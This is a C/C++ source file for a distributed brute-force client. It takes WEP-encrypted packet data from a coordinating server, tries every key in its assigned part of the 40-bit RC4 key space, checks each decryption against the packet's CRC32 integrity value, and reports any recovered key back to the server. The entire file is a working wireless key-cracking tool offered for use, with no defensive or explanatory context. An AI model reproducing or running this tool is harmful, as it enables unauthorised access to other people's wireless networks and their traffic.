#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <math.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <time.h>
#include <signal.h>

using namespace std;

#include "main.h"

#include <openssl/rc4.h>

unsigned int crc_tab[256];//crc buffer
//unsigned char buffer[64];//buffer that we send
unsigned char inbfr[1024];//incoming buffer
unsigned char pid=0;//this is the id that we are 
unsigned int bufflen=0;//length of buffer
bool shutdownflag = false;
int sa = 0;//a
int sb = 0;//b
int sc = 0;//c
int a,b,c,d,e=0;
int sock;

unsigned int chksum_crc32 (unsigned char *block, unsigned int length)
{
   register unsigned long crc;
   unsigned long i;
   crc = 0xFFFFFFFF;
   for (i = 0; i < length; i++)
      crc = ((crc >> 8) & 0x00FFFFFF) ^ crc_tab[(crc ^ *block++) & 0xFF];
   return (crc ^ 0xFFFFFFFF);
}

void chksum_crc32gentab ()
{
   unsigned long crc, poly;
   int i, j;

   poly = 0xEDB88320L;
   for (i = 0; i < 256; i++)
   {
      crc = i;
      for (j = 8; j > 0; j--)
      {
	if (crc & 1)
		crc = (crc >> 1) ^ poly;
	else
		crc >>= 1;
      }
      crc_tab[i] = crc;
   }
}
void shutnicely(int sig)
{
	//this is so we finish the packet we are working on
	printf("signal caught: Shutting down\n");
	shutdownflag = true;
	//close(sock);
	//exit(1);
}
int main(int argc, char *argv[])
{
		//catch some signals
		signal(SIGABRT, &shutnicely);
		signal(SIGTERM, &shutnicely);
		signal(SIGINT, &shutnicely);

	    chksum_crc32gentab();
            
            struct sockaddr_in echoserver;
            char buffer[64];
            unsigned int echolen;
            int received = 0;
            bufflen=0;

            if (argc < 3) {
              printf("Usage:\n");
              printf("./bruteforceclient <ip address> <port>\nEX. ./bruteforceclient 127.0.0.1 9999\n");
              exit(1);
            }

		// Construct the server sockaddr_in structure
            memset(&echoserver, 0, sizeof(echoserver));       				// Clear struct
            echoserver.sin_family = AF_INET;                  				// Internet/IP
            echoserver.sin_addr.s_addr = inet_addr(argv[1]);   				// IP address
            echoserver.sin_port = htons(atoi(argv[2]));       				// server port
            
            buffer[0]=0x01;//our starting condition
            bufflen=1;
            while(1)
            {
            	if(shutdownflag)
            	{
            		//time to shutdown so shutdown!
            		close(sock);
            		return 0;
            	}
            // Create the TCP socket 
            if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
              printf("Failed to create socket\n");
              close(sock);
              sleep(5);
            }
            // Establish connection
            printf("try to connect to server\n");
            if (connect(sock,(struct sockaddr *) &echoserver, sizeof(echoserver)) < 0) {
              printf("Failed to connect with server, sleep for 20sec\n");
              close(sock);
              sleep(5);
            }
            else
            {
            // Send the word to the server
            
            if (send(sock, buffer, bufflen, 0) != 1) {
              printf("Mismatch in number of sent bytes\n");
             //exit(1);
            }
						//now recieve
            int bytes = 0;
            if ((bytes = recv(sock, inbfr, 1024, 0)) < 1) {
              printf("Failed to receive bytes from server\n");
              //exit(1);
            }
            /*
			for(int l=0;l < bytes;l++)
			{
				printf("%02X\n",inbfr[l]);
			}
			*/
			if(inbfr[0] == 0x02)
			{
				//we got something that we should try to crack
				unsigned char * icvp;
				unsigned int crc;
				unsigned char key[8];
				unsigned int compcrc;
				
				pid = inbfr[1];//pid
				
				key[0] = inbfr[2];//iv1
      				key[1] = inbfr[3];//iv2
      				key[2] = inbfr[4];//iv3
      				//sections to try for our loop
      				sa = inbfr[5];//a
      				sb = inbfr[6];//b
      				sc = inbfr[7];//c
      				printf("Current Key Space: %02X %02X %02X %02X %02X \n",sa,sb,0x00,0x00,0x00);
      				//size of data packet
      				int data_size = (inbfr[9] << 8) | inbfr[8];
      				//printf("data size: %08X\n",data_size);
							
				unsigned char * data = new unsigned char[data_size];
				unsigned char * un_data_section = new unsigned char[data_size];
				for(int i = 0;i < data_size; i ++)
				{
					data[i] = (unsigned char)inbfr[10+i];
				}
    				unsigned long starttime = time(0);

					for(a = sa; a < sa+1;a++)
					{
						for(b = sb;b < sb+1;b++)
						{
							for(c = 0x00;c <= 0xFF;c++)
							{
								for(d = 0x00;d <= 0xFF;d++)
								{
									for(e = 0x00;e <= 0xFF;e++)
									{

										key[3] = a;//a
										key[4] = b;//b
										key[5] = c;//c
										key[6] = d;//d
										key[7] = e;//e
/**
										for(int i = 3;i <8; i++)
										{
										printf("%02X",key[i]);
										}
										printf("\n");
**/
										//data_size=3;//only do the snap header
										RC4_KEY rc4_key;
										RC4_set_key(&rc4_key, sizeof(key), key);
										RC4(&rc4_key, data_size, data, un_data_section);
/**
										if(un_data_section[0] == 0xAA && un_data_section[1] == 0xAA && un_data_section[2] == 0x03)
										{
											//snap header so possible key
											for(int i = 3;i <8; i++)
											{
												printf("%02X",key[i]);
											}
					  						printf("\n\n");
					  						printf("hopefully exit back and reconnect\n");
					  						bufflen=6;
											buffer[0]=0x04;
											for(int i = 1;i < 6; i++)
											{
												buffer[i]=key[2+i];

											}
											// Create the TCP socket
											if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
												printf("Failed to create socket\n");
												close(sock);
												sleep(5);
											}
											// Establish connection
											printf("try to connect to server\n");
												if (connect(sock,(struct sockaddr *) &echoserver, sizeof(echoserver)) < 0) {
												printf("Failed to connect with server, sleep for 20sec\n");
												close(sock);
												sleep(5);
											}
											else
											{
												// Send the word to the server

												if (send(sock, buffer, bufflen, 0) != 1) {
												printf("Mismatch in number of sent bytes\n");
												//exit(1);
												}
												bufflen=0;
												//now recieve
												int bytes = 0;
												if ((bytes = recv(sock, inbfr, 1024, 0)) < 1) {
												printf("Failed to receive bytes from server\n");
												//exit(1);
												}
											}
										}

**/
/**
										for(int i=0;i<data_size; i++)
											printf("%02X ",data[i]);
										printf("\n\n");
										for(int i=0;i<data_size; i++)
											printf("%02X ",un_data_section[i]);
										printf("\n\n");
/**/
/**/
										icvp = un_data_section + data_size - 4;
										crc = icvp[0] | (icvp[1] << 8) | (icvp[2] << 16) | (icvp[3] << 24);
										//printf("crc: %08X\n",crc);

										compcrc =  chksum_crc32(un_data_section, data_size-4);
										//printf("compcrc: %08X\n\n",compcrc);

										if(crc == compcrc)
						  				{
											for(int i = 3;i <8; i++)
											{
												printf("%02X",key[i]);
											}
					  						printf("\n\n");
					  						printf("hopefully exit back and reconnect\n");
					  						bufflen=6;
											buffer[0]=0x04;
											for(int i = 1;i < 6; i++)
											{
												buffer[i]=key[2+i];

											}
											// Create the TCP socket
											if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
												printf("Failed to create socket\n");
												close(sock);
												sleep(5);
											}
											// Establish connection
											printf("try to connect to server\n");
												if (connect(sock,(struct sockaddr *) &echoserver, sizeof(echoserver)) < 0) {
												printf("Failed to connect with server, sleep for 20sec\n");
												close(sock);
												sleep(5);
											}
											else
											{
												// Send the word to the server

												if (send(sock, buffer, bufflen, 0) != 1) {
												printf("Mismatch in number of sent bytes\n");
												//exit(1);
												}
												bufflen=0;
												//now recieve
												int bytes = 0;
												if ((bytes = recv(sock, inbfr, 1024, 0)) < 1) {
												printf("Failed to receive bytes from server\n");
												//exit(1);
												}
											}

						  				}//end of crc compare
/**/
						  				if(a==0x100 && b==0x100)
						  				break;
										}//e for loop
						  				if(a==0x100 && b==0x100)
						  				break;
									}//d for loop
						  				if(a==0x100 && b==0x100)
						  				break;
								}//c for loop
						  				if(a==0x100 && b==0x100)
						  				break;
							}//b for loop
						  				if(a==0x100 && b==0x100)
						  				break;
						}//a for loop

								for(int i = 3;i <8; i++)
								{
									printf("%02X",key[i]);
								}
	  							printf("\n");

								//end of search
				    				unsigned long endtime = time(0);
				    				unsigned long runtime = endtime - starttime;
				    				printf("runtime %d\n",runtime);
								if(bufflen != 0x06)
								{
									printf("No key found :( \n");
									//soo lets try to connect again, but send something different
									buffer[0]=0x03;//packet complete, but we found nothing
									buffer[1]=pid;
									buffer[2]=sa;
									buffer[3]=sb;
									bufflen=4;
								}
						}//end for that command
						else if(inbfr[0] == 0x05)
						{
							sleep(30);
							buffer[0]=0x03;//packet complete, but we found nothing
							buffer[1]=pid;
							buffer[2]=sa;
							buffer[3]=sb;
							bufflen=4;
						}
						else if(inbfr[0] == 0x08)
						{
							printf("key has been found so lets exit\n");
							close(sock);
							return 0;
						}
						
					}//else we connected
					close(sock);
					}//while loop




	return 0;
}
